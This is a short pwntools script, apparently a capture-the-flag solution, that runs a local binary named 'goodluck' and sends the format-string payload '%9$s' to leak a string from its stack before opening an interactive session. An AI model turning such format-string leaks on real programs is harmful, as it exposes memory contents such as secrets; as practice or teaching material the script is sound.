from pwn import *
goodluck = ELF('./goodluck')
sh = process('./goodluck')
payload = "%9$s"
sh.sendline(payload)
sh.interactive()
